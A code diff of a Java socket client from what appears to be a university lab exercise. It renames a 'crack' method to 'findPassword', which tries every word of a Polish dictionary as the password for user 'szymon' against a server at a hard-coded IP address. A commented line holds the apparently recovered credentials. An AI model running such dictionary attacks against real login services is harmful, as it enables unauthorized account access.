@@ -2,7 +2,6 @@ package lab8;
 
 import java.io.*;
 import java.net.*;
-import java.util.Scanner;
 
 public class EchoClient {
 	private Socket echoSocket = null;
@@ -13,19 +12,19 @@ public class EchoClient {
 
 	public static void main(String[] args) {
 		EchoClient haha = new EchoClient();
-		haha.crack();
+		haha.findPassword();
 		System.out.println("Finito");
-//		try {
-//			haha.loginToServer("szymon", "najakuratniej");
-//			haha.ls();
-//		} catch (IOException e) {
-//			e.printStackTrace(System.out);
-//		}
+		// try {
+		// haha.loginToServer("szymon", "zadźwigany");
+		// haha.ls();
+		// } catch (IOException e) {
+		// e.printStackTrace(System.out);
+		// }
 	}
 
 	public void connect() {
 		try {
-			echoSocket = new Socket("149.156.98.145", 3000);
+			echoSocket = new Socket("149.156.98.73", 3000);
 			out = new PrintWriter(echoSocket.getOutputStream(), true);
 			in = new BufferedReader(new InputStreamReader(
 					echoSocket.getInputStream()));
@@ -79,7 +78,6 @@ public class EchoClient {
 		String result = in.readLine();
 		System.out.println("echo: " + result);
 		closeAll();
-		System.out.println("ha");
 		if (result.equals("false"))
 			return false;
 		files = result.split(";");
@@ -100,33 +98,37 @@ public class EchoClient {
 		return !result.equals("false");
 	}
 
-	public void crack()	{
+	public void findPassword() {
 		try {
 			FileInputStream fstream = new FileInputStream("polish-dic.txt");
 			DataInputStream inn = new DataInputStream(fstream);
 			BufferedReader br = new BufferedReader(new InputStreamReader(inn));
 			String strLine;
 			int i = 0;
-			int j = 0;
+			boolean flag = false;
 			while ((strLine = br.readLine()) != null) {
-				System.out.println(strLine);
-				connect();
-				Scanner sc = new Scanner(strLine).useDelimiter("/");
-				strLine = sc.next();
-				// System.out.println(strLine);
-				out.println("LOGIN szymon;" + strLine);
-				out.flush();
-				String result = in.readLine();
-				
-				if (i % 1000 == 0) {
-					System.out.println(i);
+				if (strLine.contains("zadźwigany")) {
+					flag = true;
 				}
-
-				if (!result.equals("false"))				{
+				if (flag) {
 					System.out.println(strLine);
-					break;
+					connect();
+					strLine = strLine.split("/")[0];
+					// System.out.println(strLine);
+					out.println("LOGIN szymon;" + strLine);
+					out.flush();
+					String result = in.readLine();
+
+					if (i % 1000 == 0) {
+						System.out.println(i);
+					}
+
+					if (!result.equals("false")) {
+						System.out.println(strLine);
+						break;
+					}
+					i++;
 				}
-				i++;
 				closeAll();
 			}
 		} catch (IOException e) {
